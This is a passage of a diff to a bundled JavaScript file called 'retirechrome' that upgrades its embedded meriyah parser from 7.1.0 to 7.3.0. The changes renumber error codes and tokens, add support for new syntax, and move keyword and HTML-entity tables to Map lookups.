@@ -1,14 +1,21 @@
 var retirechrome = (() => {
   var __getOwnPropNames = Object.getOwnPropertyNames;
   var __commonJS = (cb, mod) => function __require() {
-    return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
+    try {
+      return mod || (0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), mod.exports;
+    } catch (e) {
+      throw mod = 0, e;
+    }
   };
 
   // ../../node/node_modules/meriyah/dist/meriyah.cjs
   var require_meriyah = __commonJS({
     "../../node/node_modules/meriyah/dist/meriyah.cjs"(exports) {
       "use strict";
-      var version$1 = "7.1.0";
+      var version$1 = "7.3.0";
+      var packageJson = {
+        version: version$1
+      };
       var unicodeLookup = ((compressed, lookup) => {
         const result = new Uint32Array(69632);
         let index = 0;
@@ -476,7 +483,7 @@ var retirechrome = (() => {
             return "RegularExpression";
           case 67174408:
           case 67174409:
-          case 131:
+          case 132:
             return "TemplateLiteral";
           default:
             if ((t & 143360) === 143360)
@@ -604,7 +611,7 @@ var retirechrome = (() => {
         [9]: "Octal literals are not allowed in strict mode",
         [8]: "Decimal integer literals with a leading zero are forbidden in strict mode",
         [10]: "Expected number in radix %0",
-        [151]: "Invalid left-hand side assignment to a destructible right-hand side",
+        [153]: "Invalid left-hand side assignment to a destructible right-hand side",
         [11]: "Non-number found after exponent indicator",
         [12]: "Invalid BigIntLiteral",
         [13]: "No identifiers allowed directly after numeric literal",
@@ -628,7 +635,7 @@ var retirechrome = (() => {
         [32]: "Yield expression not allowed in formal parameter",
         [95]: "Unexpected token: 'escaped keyword'",
         [33]: "Unary expressions as the left operand of an exponentiation expression must be disambiguated with parentheses",
-        [123]: "Async functions can only be declared at the top level or inside a block",
+        [125]: "Async functions can only be declared at the top level or inside a block",
         [34]: "Unterminated regular expression",
         [35]: "Unexpected regular expression flag",
         [36]: "Duplicate regular expression flag '%0'",
@@ -640,7 +647,7 @@ var retirechrome = (() => {
         [42]: "A getter cannot be a generator",
         [43]: "A setter cannot be a generator",
         [44]: "A computed property name must be followed by a colon or paren",
-        [134]: "Object literal keys that are strings or numbers must be a method or have a colon",
+        [136]: "Object literal keys that are strings or numbers must be a method or have a colon",
         [46]: "Found `* async x(){}` but this should be `async * x(){}`",
         [45]: "Getters and setters can not be generators",
         [47]: "'%0' can not be generator method",
@@ -702,73 +709,75 @@ var retirechrome = (() => {
         [105]: "%0 source must be string",
         [106]: "Only a identifier or string can be used to indicate alias",
         [107]: "Only '*' or '{...}' can be imported after default",
-        [108]: "Trailing decorator may be followed by method",
-        [109]: "Decorators can't be used with a constructor",
-        [110]: "Can not use `await` as identifier in module or async func",
-        [111]: "Can not use `await` as identifier in module",
-        [112]: "HTML comments are only allowed with web compatibility (Annex B)",
-        [113]: "The identifier 'let' must not be in expression position in strict mode",
-        [114]: "Cannot assign to `eval` and `arguments` in strict mode",
-        [115]: "The left-hand side of a for-of loop may not start with 'let'",
-        [116]: "Block body arrows can not be immediately invoked without a group",
-        [117]: "Block body arrows can not be immediately accessed without a group",
-        [118]: "Unexpected strict mode reserved word",
-        [119]: "Unexpected eval or arguments in strict mode",
-        [120]: "Decorators must not be followed by a semicolon",
-        [121]: "Calling delete on expression not allowed in strict mode",
-        [122]: "Pattern can not have a tail",
-        [124]: "Can not have a `yield` expression on the left side of a ternary",
-        [125]: "An arrow function can not have a postfix update operator",
-        [126]: "Invalid object literal key character after generator star",
-        [127]: "Private fields can not be deleted",
-        [129]: "Classes may not have a field called constructor",
-        [128]: "Classes may not have a private element named constructor",
-        [130]: "A class field initializer or static block may not contain arguments",
-        [131]: "Generators can only be declared at the top level or inside a block",
-        [132]: "Async methods are a restricted production and cannot have a newline following it",
-        [133]: "Unexpected character after object literal property name",
-        [135]: "Invalid key token",
-        [136]: "Label '%0' has already been declared",
-        [137]: "continue statement must be nested within an iteration statement",
-        [138]: "Undefined label '%0'",
-        [139]: "Trailing comma is disallowed inside import(...) arguments",
-        [140]: "Invalid binding in JSON import",
-        [141]: "import() requires exactly one argument",
-        [142]: "Cannot use new with import(...)",
-        [143]: "... is not allowed in import()",
-        [144]: "Expected '=>'",
-        [145]: "Duplicate binding '%0'",
-        [146]: "Duplicate private identifier #%0",
-        [147]: "Cannot export a duplicate name '%0'",
-        [150]: "Duplicate %0 for-binding",
-        [148]: "Exported binding '%0' needs to refer to a top-level declared variable",
-        [149]: "Unexpected private field",
-        [153]: "Numeric separators are not allowed at the end of numeric literals",
-        [152]: "Only one underscore is allowed as numeric separator",
-        [154]: "JSX value should be either an expression or a quoted JSX text",
-        [155]: "Expected corresponding JSX closing tag for %0",
-        [156]: "Adjacent JSX elements must be wrapped in an enclosing tag",
-        [157]: "JSX attributes must only be assigned a non-empty 'expression'",
-        [158]: "'%0' has already been declared",
-        [159]: "'%0' shadowed a catch clause binding",
-        [160]: "Dot property must be an identifier",
-        [161]: "Encountered invalid input after spread/rest argument",
-        [162]: "Catch without try",
-        [163]: "Finally without try",
-        [164]: "Expected corresponding closing tag for JSX fragment",
-        [165]: "Coalescing and logical operators used together in the same expression must be disambiguated with parentheses",
-        [166]: "Invalid tagged template on optional chain",
-        [167]: "Invalid optional chain from super property",
-        [168]: "Invalid optional chain from new expression",
-        [169]: 'Cannot use "import.meta" outside a module',
-        [170]: "Leading decorators must be attached to a class declaration",
-        [171]: "An export name cannot include a lone surrogate",
-        [172]: "A string literal cannot be used as an exported binding without `from`",
-        [173]: "Private fields can't be accessed on super",
-        [174]: "The only valid meta property for import is 'import.meta'",
-        [175]: "'import.meta' must not contain escaped characters",
-        [176]: 'cannot use "await" as identifier inside an async function',
-        [177]: 'cannot use "await" in static blocks'
+        [108]: "'import defer' must be followed by a namespace import",
+        [109]: "'import source' must be followed by a default import",
+        [110]: "Trailing decorator may be followed by method",
+        [111]: "Decorators can't be used with a constructor",
+        [112]: "Can not use `await` as identifier in module or async func",
+        [113]: "Can not use `await` as identifier in module",
+        [114]: "HTML comments are only allowed with web compatibility (Annex B)",
+        [115]: "The identifier 'let' must not be in expression position in strict mode",
+        [116]: "Cannot assign to `eval` and `arguments` in strict mode",
+        [117]: "The left-hand side of a for-of loop may not start with 'let'",
+        [118]: "Block body arrows can not be immediately invoked without a group",
+        [119]: "Block body arrows can not be immediately accessed without a group",
+        [120]: "Unexpected strict mode reserved word",
+        [121]: "Unexpected eval or arguments in strict mode",
+        [122]: "Decorators must not be followed by a semicolon",
+        [123]: "Calling delete on expression not allowed in strict mode",
+        [124]: "Pattern can not have a tail",
+        [126]: "Can not have a `yield` expression on the left side of a ternary",
+        [127]: "An arrow function can not have a postfix update operator",
+        [128]: "Invalid object literal key character after generator star",
+        [129]: "Private fields can not be deleted",
+        [131]: "Classes may not have a field called constructor",
+        [130]: "Classes may not have a private element named constructor",
+        [132]: "A class field initializer or static block may not contain arguments",
+        [133]: "Generators can only be declared at the top level or inside a block",
+        [134]: "Async methods are a restricted production and cannot have a newline following it",
+        [135]: "Unexpected character after object literal property name",
+        [137]: "Invalid key token",
+        [138]: "Label '%0' has already been declared",
+        [139]: "continue statement must be nested within an iteration statement",
+        [140]: "Undefined label '%0'",
+        [141]: "Trailing comma is disallowed inside import(...) arguments",
+        [142]: "Invalid binding in JSON import",
+        [143]: "import() requires exactly one argument",
+        [144]: "Cannot use new with import(...)",
+        [145]: "... is not allowed in import()",
+        [146]: "Expected '=>'",
+        [147]: "Duplicate binding '%0'",
+        [148]: "Duplicate private identifier #%0",
+        [149]: "Cannot export a duplicate name '%0'",
+        [152]: "Duplicate %0 for-binding",
+        [150]: "Exported binding '%0' needs to refer to a top-level declared variable",
+        [151]: "Unexpected private field",
+        [155]: "Numeric separators are not allowed at the end of numeric literals",
+        [154]: "Only one underscore is allowed as numeric separator",
+        [156]: "JSX value should be either an expression or a quoted JSX text",
+        [157]: "Expected corresponding JSX closing tag for %0",
+        [158]: "Adjacent JSX elements must be wrapped in an enclosing tag",
+        [159]: "JSX attributes must only be assigned a non-empty 'expression'",
+        [160]: "'%0' has already been declared",
+        [161]: "'%0' shadowed a catch clause binding",
+        [162]: "Dot property must be an identifier",
+        [163]: "Encountered invalid input after spread/rest argument",
+        [164]: "Catch without try",
+        [165]: "Finally without try",
+        [166]: "Expected corresponding closing tag for JSX fragment",
+        [167]: "Coalescing and logical operators used together in the same expression must be disambiguated with parentheses",
+        [168]: "Invalid tagged template on optional chain",
+        [169]: "Invalid optional chain from super property",
+        [170]: "Invalid optional chain from new expression",
+        [171]: 'Cannot use "import.meta" outside a module',
+        [172]: "Leading decorators must be attached to a class declaration",
+        [173]: "An export name cannot include a lone surrogate",
+        [174]: "A string literal cannot be used as an exported binding without `from`",
+        [175]: "Private fields can't be accessed on super",
+        [176]: "The only valid meta property for import is 'import.meta'",
+        [177]: "'import.meta' must not contain escaped characters",
+        [178]: 'cannot use "await" as identifier inside an async function',
+        [179]: 'cannot use "await" in static blocks'
       };
       var ParseError = class extends SyntaxError {
         start;
@@ -777,7 +786,7 @@ var retirechrome = (() => {
         loc;
         description;
         constructor(start, end, type, ...params) {
-          const description = errorMessages[type].replace(/%(\d+)/g, (_, i) => params[i]);
+          const description = errorMessages[type].replaceAll(/%(\d+)/g, (_, i) => params[i]);
           const message = "[" + start.line + ":" + start.column + "-" + end.line + ":" + end.column + "]: " + description;
           super(message);
           this.start = start.index;
@@ -791,9 +800,6 @@ var retirechrome = (() => {
         }
       };
       var isParseError = (error) => error instanceof ParseError;
-      function getOwnProperty(object, key) {
-        return Object.hasOwn(object, key) ? object[key] : void 0;
-      }
       var KeywordDescTable = [
         "end of source",
         "identifier",
@@ -912,6 +918,7 @@ var retirechrome = (() => {
         "accessor",
         "from",
         "of",
+        "using",
         "enum",
         "eval",
         "arguments",
@@ -934,71 +941,81 @@ var retirechrome = (() => {
         "Escaped",
         "JSXText"
       ];
-      var descKeywordTable = {
-        this: 86111,
-        function: 86104,
-        if: 20569,
-        return: 20572,
-        var: 86088,
-        else: 20563,
-        for: 20567,
-        new: 86107,
-        in: 8673330,
-        typeof: 16863275,
-        while: 20578,
-        case: 20556,
-        break: 20555,
-        try: 20577,
-        catch: 20557,
-        delete: 16863276,
-        throw: 86112,
-        switch: 86110,
-        continue: 20559,
-        default: 20561,
-        instanceof: 8411187,
-        do: 20562,
-        void: 16863277,
-        finally: 20566,
-        async: 209005,
-        await: 209006,
-        class: 86094,
-        const: 86090,
-        constructor: 12399,
-        debugger: 20560,
-        export: 20564,
-        extends: 20565,
-        false: 86021,
-        from: 209011,
-        get: 209008,
-        implements: 36964,
-        import: 86106,
-        interface: 36965,
-        let: 241737,
-        null: 86023,
-        of: 471156,
-        package: 36966,
-        private: 36967,
-        protected: 36968,
-        public: 36969,
-        set: 209009,
-        static: 36970,
-        super: 86109,
-        true: 86022,
-        with: 20579,
-        yield: 241771,
-        enum: 86133,
-        eval: 537079926,
-        as: 77932,
-        arguments: 537079927,
-        target: 209029,
-        meta: 209030,
-        accessor: 12402
-      };
+      var descKeywordTable = /* @__PURE__ */ new Map([
+        ["this", 86111],
+        ["function", 86104],
+        ["if", 20569],
+        ["return", 20572],
+        ["var", 86088],
+        ["else", 20563],
+        ["for", 20567],
+        ["new", 86107],
+        ["in", 8673330],
+        ["typeof", 16863275],
+        ["while", 20578],
+        ["case", 20556],
+        ["break", 20555],
+        ["try", 20577],
+        ["catch", 20557],
+        ["delete", 16863276],
+        ["throw", 86112],
+        ["switch", 86110],
+        ["continue", 20559],
+        ["default", 20561],
+        ["instanceof", 8411187],
+        ["do", 20562],
+        ["void", 16863277],
+        ["finally", 20566],
+        ["async", 209005],
+        ["await", 209006],
+        ["class", 86094],
+        ["const", 86090],
+        ["constructor", 12399],
+        ["debugger", 20560],
+        ["export", 20564],
+        ["extends", 20565],
+        ["false", 86021],
+        ["from", 209011],
+        ["get", 209008],
+        ["implements", 36964],
+        ["import", 86106],
+        ["interface", 36965],
+        ["let", 241737],
+        ["null", 86023],
+        ["of", 471156],
+        ["using", 209013],
+        ["package", 36966],
+        ["private", 36967],
+        ["protected", 36968],
+        ["public", 36969],
+        ["set", 209009],
+        ["static", 36970],
+        ["super", 86109],
+        ["true", 86022],
+        ["with", 20579],
+        ["yield", 241771],
+        ["enum", 86134],
+        ["eval", 537079927],
+        ["as", 77932],
+        ["arguments", 537079928],
+        ["target", 209030],
+        ["meta", 209031],
+        ["accessor", 12402]
+      ]);
+      var keywordLengths = [...descKeywordTable.keys()].map((keyword) => keyword.length);
+      var minKeywordLength = Math.min(...keywordLengths);
+      var maxKeywordLength = Math.max(...keywordLengths);
       function scanIdentifier(parser, context, isValidAsKeyword) {
         while (isIdPart[advanceChar(parser)])
           ;
         parser.tokenValue = parser.source.slice(parser.tokenIndex, parser.index);
-        return parser.currentChar !== 92 && parser.currentChar <= 126 ? getOwnProperty(descKeywordTable, parser.tokenValue) ?? 208897 : scanIdentifierSlowCase(parser, context, 0, isValidAsKeyword);
+        if (parser.currentChar === 92 || parser.currentChar > 126) {
+          return scanIdentifierSlowCase(parser, context, 0, isValidAsKeyword);
+        }
+        const length = parser.index - parser.tokenIndex;
+        if (length < minKeywordLength || length > maxKeywordLength)
+          return 208897;
+        return descKeywordTable.get(parser.tokenValue) ?? 208897;
       }
       function scanUnicodeIdentifier(parser, context) {
         const cookedChar = scanIdentifierUnicodeEscape(parser);
@@ -1038,8 +1055,8 @@ var retirechrome = (() => {
           parser.tokenValue += parser.source.slice(start, parser.index);
         }
         const { length } = parser.tokenValue;
-        if (isValidAsKeyword && length >= 2 && length <= 11) {
-          const token = getOwnProperty(descKeywordTable, parser.tokenValue);
+        if (isValidAsKeyword && length >= minKeywordLength && length <= maxKeywordLength) {
+          const token = descKeywordTable.get(parser.tokenValue);
           if (token === void 0)
             return 208897 | (hasEscape ? -2147483648 : 0);
           if (!hasEscape)
@@ -1048,50 +1065,50 @@ var retirechrome = (() => {
             if ((context & (2 | 2048)) === 0) {
               return token | -2147483648;
             }
-            return -2147483528;
+            return -2147483527;
           }
           if (context & 1) {
             if (token === 36970) {
-              return -2147483527;
+              return -2147483526;
             }
             if ((token & 36864) === 36864) {
-              return -2147483527;
+              return -2147483526;
             }
             if ((token & 20480) === 20480) {
               if (context & 262144 && (context & 8) === 0) {
                 return token | -2147483648;
               } else {
-                return -2147483528;
+                return -2147483527;
               }
             }
-            return 209018 | -2147483648;
+            return 209019 | -2147483648;
           }
           if (context & 262144 && (context & 8) === 0 && (token & 20480) === 20480) {
             return token | -2147483648;
           }
           if (token === 241771) {
-            return context & 262144 ? 209018 | -2147483648 : context & 1024 ? -2147483528 : token | -2147483648;
+            return context & 262144 ? 209019 | -2147483648 : context & 1024 ? -2147483527 : token | -2147483648;
           }
           if (token === 209005) {
-            return 209018 | -2147483648;
+            return 209019 | -2147483648;
           }
           if ((token & 36864) === 36864) {
             return token | 12288 | -2147483648;
           }
-          return -2147483528;
+          return -2147483527;
         }
         return 208897 | (hasEscape ? -2147483648 : 0);
       }
       function scanPrivateIdentifier(parser) {
         let char = advanceChar(parser);
         if (char === 92)
-          return 130;
+          return 131;
         const merged = consumePossibleSurrogatePair(parser);
         if (merged)
           char = merged;
         if (!isIdentifierStart(char))
           parser.report(96);
-        return 130;
+        return 131;
       }
       function scanIdentifierUnicodeEscape(parser) {
         if (parser.source.charCodeAt(parser.index + 1) !== 117) {
@@ -1154,7 +1171,7 @@ var retirechrome = (() => {
               while (CharTypes[char] & (64 | 4096)) {
                 if (char === 95) {
                   if (!allowSeparator)
-                    parser.report(152);
+                    parser.report(154);
                   allowSeparator = 0;
                   char = advanceChar(parser);
                   continue;
@@ -1165,7 +1182,7 @@ var retirechrome = (() => {
                 char = advanceChar(parser);
               }
               if (digits === 0 || !allowSeparator) {
-                parser.report(digits === 0 ? 21 : 153);
+                parser.report(digits === 0 ? 21 : 155);
               }
             } else if ((char | 32) === 111) {
               kind = 4 | 128;
@@ -1173,7 +1190,7 @@ var retirechrome = (() => {
               while (CharTypes[char] & (32 | 4096)) {
                 if (char === 95) {
                   if (!allowSeparator) {
-                    parser.report(152);
+                    parser.report(154);
                   }
                   allowSeparator = 0;
                   char = advanceChar(parser);
@@ -1185,7 +1202,7 @@ var retirechrome = (() => {
                 char = advanceChar(parser);
               }
               if (digits === 0 || !allowSeparator) {
-                parser.report(digits === 0 ? 0 : 153);
+                parser.report(digits === 0 ? 0 : 155);
               }
             } else if ((char | 32) === 98) {
               kind = 2 | 128;
@@ -1193,7 +1210,7 @@ var retirechrome = (() => {
               while (CharTypes[char] & (128 | 4096)) {
                 if (char === 95) {
                   if (!allowSeparator) {
-                    parser.report(152);
+                    parser.report(154);
                   }
                   allowSeparator = 0;
                   char = advanceChar(parser);
@@ -1205,7 +1222,7 @@ var retirechrome = (() => {
                 char = advanceChar(parser);
               }
               if (digits === 0 || !allowSeparator) {
-                parser.report(digits === 0 ? 0 : 153);
+                parser.report(digits === 0 ? 0 : 155);
               }
             } else if (CharTypes[char] & 32) {
               if (context & 1)
@@ -1235,7 +1252,7 @@ var retirechrome = (() => {
                 if (char === 95) {
                   char = advanceChar(parser);
                   if (char === 95 || kind & 32) {
-                    throw new ParseError(parser.currentLocation, { index: parser.index + 1, line: parser.line, column: parser.column }, 152);
+                    throw new ParseError(parser.currentLocation, { index: parser.index + 1, line: parser.line, column: parser.column }, 154);
                   }
                   allowSeparator = 1;
                   continue;
@@ -1246,7 +1263,7 @@ var retirechrome = (() => {
                 --digit;
               }
               if (allowSeparator) {
-                throw new ParseError(parser.currentLocation, { index: parser.index + 1, line: parser.line, column: parser.column }, 153);
+                throw new ParseError(parser.currentLocation, { index: parser.index + 1, line: parser.line, column: parser.column }, 155);
               }
               if (digit >= 0 && !isIdentifierStart(char) && char !== 46) {
                 parser.tokenValue = value;
@@ -1289,7 +1306,7 @@ var retirechrome = (() => {
         if (isBigInt) {
           parser.tokenRaw = parser.source.slice(parser.tokenIndex, parser.index);
           parser.tokenValue = BigInt(parser.tokenRaw.slice(0, -1).replaceAll("_", ""));
-          return 134283388;
+          return 134283389;
         }
         parser.tokenValue = kind & (1 | 2 | 8 | 4) ? value : kind & 32 ? parseFloat(parser.source.substring(parser.tokenIndex, parser.index)) : +value;
         if (parser.options.raw)
@@ -1305,7 +1322,7 @@ var retirechrome = (() => {
             const { index } = parser;
             char = advanceChar(parser);
             if (char === 95) {
-              throw new ParseError(parser.currentLocation, { index: parser.index + 1, line: parser.line, column: parser.column }, 152);
+              throw new ParseError(parser.currentLocation, { index: parser.index + 1, line: parser.line, column: parser.column }, 154);
             }
             allowSeparator = 1;
             ret += parser.source.substring(start, index);
@@ -1316,7 +1333,7 @@ var retirechrome = (() => {
           char = advanceChar(parser);
         }
         if (allowSeparator) {
-          throw new ParseError(parser.currentLocation, { index: parser.index + 1, line: parser.line, column: parser.column }, 153);
+          throw new ParseError(parser.currentLocation, { index: parser.index + 1, line: parser.line, column: parser.column }, 155);
         }
         return ret + parser.source.substring(start, parser.index);
       }
@@ -1584,12 +1601,14 @@ var retirechrome = (() => {
             const ch = advanceChar(parser);
             if (parser.currentChar === 123) {
               let code = 0;
+              let digits = 0;
               while ((CharTypes[advanceChar(parser)] & 64) !== 0) {
                 code = code << 4 | toHex(parser.currentChar);
                 if (code > 1114111)
                   return -5;
+                digits++;
               }
-              if (parser.currentChar < 1 || parser.currentChar !== 125) {
+              if (digits === 0 || parser.currentChar < 1 || parser.currentChar !== 125) {
                 return -4;
               }
               return code;
@@ -1613,7 +1632,7 @@ var retirechrome = (() => {
           }
           case 56:
           case 57:
-            if (isTemplate || !parser.options.webcompat || context & 1)
+            if (isTemplate || context & 1)
               return -3;
             parser.flags |= 4096;
           default:
@@ -1638,6 +1657,7 @@ var retirechrome = (() => {
         const { index: start } = parser;
         let token = 67174409;
         let ret = "";
+        let hasCarriageReturn = false;
         let char = advanceChar(parser);
         while (char !== 96) {
           if (char === 36 && parser.source.charCodeAt(parser.index + 1) === 123) {
@@ -1646,6 +1666,8 @@ var retirechrome = (() => {
             break;
           } else if (char === 92) {
             char = advanceChar(parser);
+            if (char === 13)
+              hasCarriageReturn = true;
             if (char > 126) {
               ret += String.fromCodePoint(char);
             } else {
@@ -1658,7 +1680,9 @@ var retirechrome = (() => {
                 parser.line = line;
                 parser.column = column;
                 ret = null;
-                char = scanBadTemplate(parser, char);
+                char = scanBadTemplate(parser, char, () => {
+                  hasCarriageReturn = true;
+                });
                 if (char < 0)
                   token = 67174408;
                 break;
@@ -1667,10 +1691,13 @@ var retirechrome = (() => {
               }
             }
           } else if (parser.index < parser.end) {
-            if (char === 13 && parser.source.charCodeAt(parser.index) === 10) {
-              ret += String.fromCodePoint(char);
+            if (char === 13)
+              hasCarriageReturn = true;
+            if (char === 13 && parser.source.charCodeAt(parser.index + 1) === 10) {
               parser.currentChar = parser.source.charCodeAt(++parser.index);
             }
+            if (char === 13)
+              char = 10;
             if ((char & 83) < 3 && char === 10 || (char ^ 8232) <= 1) {
               parser.column = -1;
               parser.line++;
@@ -1683,12 +1710,16 @@ var retirechrome = (() => {
         }
         advanceChar(parser);
         parser.tokenValue = ret;
-        parser.tokenRaw = parser.source.slice(start + 1, parser.index - (token === 67174409 ? 1 : 2));
+        const tokenRaw = parser.source.slice(start + 1, parser.index - (token === 67174409 ? 1 : 2));
+        parser.tokenRaw = hasCarriageReturn ? tokenRaw.replaceAll(/\r\n?/g, "\n") : tokenRaw;
         return token;
       }
-      function scanBadTemplate(parser, ch) {
+      function scanBadTemplate(parser, ch, onCarriageReturn) {
         while (ch !== 96) {
           switch (ch) {
+            case 13:
+              onCarriageReturn();
+              break;
             case 36: {
               const index = parser.index + 1;
               if (index < parser.end && parser.source.charCodeAt(index) === 123) {
@@ -1718,42 +1749,42 @@ var retirechrome = (() => {
         return scanTemplate(parser, context);
       }
       var TokenLookup = [
-        128,
-        128,
-        128,
-        128,
-        128,
-        128,
-        128,
-        128,
-        128,
-        127,
-        135,
-        127,
-        127,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
         129,
         128,
+        136,
         128,
         128,
+        130,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
+        129,
         128,
-        128,
-        128,
-        128,
-        128,
-        128,
-        128,
-        128,
-        128,
-        128,
-        128,
-        128,
-        128,
-        128,
-        128,
-        127,
         16842798,
         134283267,
-        130,
+        131,
         208897,
         8391477,
         8390213,
@@ -1782,7 +1813,7 @@ var retirechrome = (() => {
         1077936155,
         8390721,
         22,
-        132,
+        133,
         208897,
         208897,
         208897,
@@ -1810,11 +1841,11 @@ var retirechrome = (() => {
         208897,
         208897,
         69271571,
-        136,
+        137,
         20,
         8389959,
         208897,
-        131,
+        132,
         4096,
         4096,
         4096,
@@ -1845,7 +1876,7 @@ var retirechrome = (() => {
         8389702,
         1074790415,
         16842799,
-        128
+        129
       ];
       function nextToken(parser, context) {
         parser.flags = (parser.flags | 1) ^ 1;
@@ -1875,8 +1906,8 @@ var retirechrome = (() => {
               case 1074790417:
               case 18:
               case 16842799:
-              case 132:
-              case 128:
+              case 133:
+              case 129:
                 advanceChar(parser);
                 return token;
               case 208897:
@@ -1887,20 +1918,20 @@ var retirechrome = (() => {
                 return scanNumber(parser, context, 16 | 128);
               case 134283267:
                 return scanString(parser, context, char);
-              case 131:
+              case 132:
                 return scanTemplate(parser, context);
-              case 136:
+              case 137:
                 return scanUnicodeIdentifier(parser, context);
-              case 130:
+              case 131:
                 return scanPrivateIdentifier(parser);
-              case 127:
+              case 128:
                 advanceChar(parser);
                 break;
-              case 129:
+              case 130:
                 state |= 1 | 4;
                 scanNewLine(parser);
                 break;
-              case 135:
+              case 136:
                 consumeLineFeed(parser, state);
                 state = state & -5 | 1;
                 break;
@@ -2001,7 +2032,7 @@ var retirechrome = (() => {
                   advanceChar(parser);
                   if ((state & 1 || isStartOfLine) && parser.currentChar === 62) {
                     if (!parser.options.webcompat)
-                      parser.report(112);
+                      parser.report(114);
                     advanceChar(parser);
                     state = skipSingleHTMLComment(parser, source, state, context, 3, parser.tokenStart);
                     continue;
@@ -2120,7 +2151,7 @@ var retirechrome = (() => {
                     advanceChar(parser);
                     return 4718634;
                   }
-                  return 276824445;
+                  return 276824446;
                 }
                 if (ch === 46) {
                   const index = parser.index + 1;
@@ -2128,7 +2159,7 @@ var retirechrome = (() => {
                     ch = source.charCodeAt(index);
                     if (!(ch >= 48 && ch <= 57)) {
                       advanceChar(parser);
-                      return 67108990;
+                      return 67108991;
                     }
                   }
                 }
@@ -2228,20 +2259,20 @@ var retirechrome = (() => {
       function validateBindingIdentifier(parser, context, kind, t, skipEvalArgCheck) {
         if (context & 1) {
           if ((t & 36864) === 36864) {
-            parser.report(118);
+            parser.report(120);
           }
           if (!skipEvalArgCheck && (t & 537079808) === 537079808) {
-            parser.report(119);
+            parser.report(121);
           }
         }
-        if ((t & 20480) === 20480 || t === -2147483528) {
+        if ((t & 20480) === 20480 || t === -2147483527) {
           parser.report(102);
         }
         if (kind & (8 | 16) && (t & 255) === (241737 & 255)) {
           parser.report(100);
         }
         if (context & (2048 | 2) && t === 209006) {
-          parser.report(110);
+          parser.report(112);
         }
         if (context & (1024 | 1) && t === 241771) {
           parser.report(97, "yield");
@@ -2250,15 +2281,15 @@ var retirechrome = (() => {
       function validateFunctionName(parser, context, t) {
         if (context & 1) {
           if ((t & 36864) === 36864) {
-            parser.report(118);
+            parser.report(120);
           }
           if ((t & 537079808) === 537079808) {
-            parser.report(119);
+            parser.report(121);
           }
-          if (t === -2147483527) {
+          if (t === -2147483526) {
             parser.report(95);
           }
-          if (t === -2147483528) {
+          if (t === -2147483527) {
             parser.report(95);
           }
         }
@@ -2266,7 +2297,7 @@ var retirechrome = (() => {
           parser.report(102);
         }
         if (context & (2048 | 2) && t === 209006) {
-          parser.report(110);
+          parser.report(112);
         }
         if (context & (1024 | 1) && t === 241771) {
           parser.report(97, "yield");
@@ -2275,12 +2306,12 @@ var retirechrome = (() => {
       function isStrictReservedWord(parser, context, t) {
         if (t === 209006) {
           if (context & (2048 | 2))
-            parser.report(110);
+            parser.report(112);
           parser.destructible |= 128;
         }
         if (t === 241771 && context & 1024)
           parser.report(97, "yield");
-        return (t & 20480) === 20480 || (t & 36864) === 36864 || t == -2147483527;
+        return (t & 20480) === 20480 || (t & 36864) === 36864 || t == -2147483526;
       }
       function isPropertyWithPrivateFieldKey(expr) {
         return !expr.property ? false : expr.property.type === "PrivateIdentifier";
@@ -2289,7 +2320,7 @@ var retirechrome = (() => {
         while (labels) {
           if (labels["$" + name]) {
             if (isIterationStatement)
-              parser.report(137);
+              parser.report(139);
             return 1;
           }
           if (isIterationStatement && labels.loop)
@@ -2302,7 +2333,7 @@ var retirechrome = (() => {
         let set = labels;
         while (set) {
           if (set["$" + name])
-            parser.report(136, name);
+            parser.report(138, name);
           set = set["$"];
         }
         labels["$" + name] = 1;
@@ -2330,13 +2361,13 @@ var retirechrome = (() => {
       function classifyIdentifier(parser, context, t) {
         if ((t & 537079808) === 537079808) {
           if (context & 1)
-            parser.report(119);
+            parser.report(121);
           parser.flags |= 512;
         }
         if (!isValidIdentifier(context, t))
           parser.report(0);
       }
-      var entities = {
+      var entities = new Map(Object.entries({
         AElig: "\xC6",
         AMP: "&",
         Aacute: "\xC1",
@@ -4462,8 +4493,8 @@ var retirechrome = (() => {
         zscr: "\u{1D4CF}",
         zwj: "\u200D",
         zwnj: "\u200C"
-      };
-      var decodeMap = {
+      }));
+      var decodeMap = new Map(Object.entries({
         "0": 65533,
         "128": 8364,
         "130": 8218,
@@ -4492,22 +4523,22 @@ var retirechrome = (() => {
         "156": 339,
         "158": 382,
         "159": 376
-      };
+      }).map(([key, value]) => [Number(key), value]));
       function decodeHTMLStrict(text) {
-        return text.replace(/&(?:[a-zA-Z]+|#[xX][\da-fA-F]+|#\d+);/g, (key) => {
+        return text.replaceAll(/&(?:[a-zA-Z]+|#[xX][\da-fA-F]+|#\d+);/g, (key) => {
           if (key.charAt(1) === "#") {
             const secondChar = key.charAt(2);
             const codePoint = secondChar === "X" || secondChar === "x" ? parseInt(key.slice(3), 16) : parseInt(key.slice(2), 10);
             return decodeCodePoint(codePoint);
           }
-          return getOwnProperty(entities, key.slice(1, -1)) ?? key;
+          return entities.get(key.slice(1, -1)) ?? key;
         });
       }
       function decodeCodePoint(codePoint) {
         if (codePoint >= 55296 && codePoint <= 57343 || codePoint > 1114111) {
           return "\uFFFD";
         }
-        return String.fromCodePoint(getOwnProperty(decodeMap, codePoint) ?? codePoint);
+        return String.fromCodePoint(decodeMap.get(codePoint) ?? codePoint);
       }
       function scanJSXAttributeValue(parser, context) {
         parser.startIndex = parser.tokenIndex = parser.index;
@@ -4572,7 +4603,7 @@ var retirechrome = (() => {
         if (parser.options.raw)
           parser.tokenRaw = raw;
         parser.tokenValue = decodeHTMLStrict(raw);
-        parser.setToken(137);
+        parser.setToken(138);
       }
       function rescanJSXIdentifier(parser) {
         if ((parser.getToken() & 143360) === 143360) {
@@ -4586,17 +4617,40 @@ var retirechrome = (() => {
         }
         return parser.getToken();
       }
+      var nextFeatures = 1 | 2 | 4;
+      function normalizeRanges(ranges) {
+        if (!ranges)
+          return void 0;
+        if (ranges === true)
+          return { start: true, end: true, range: true };
+        return {
+          start: ranges.start ?? false,
+          end: ranges.end ?? false,
+          range: ranges.range ?? false
+        };
+      }
       function normalizeOptions(rawOptions) {
-        const options = {
+        let { features, next, ranges, module: module2, sourceType, globalReturn, ...restOptions } = {
           validateRegex: true,
+          features: 0,
           ...rawOptions
         };
-        if (options.module && !options.sourceType) {
-          options.sourceType = "module";
+        if (next) {
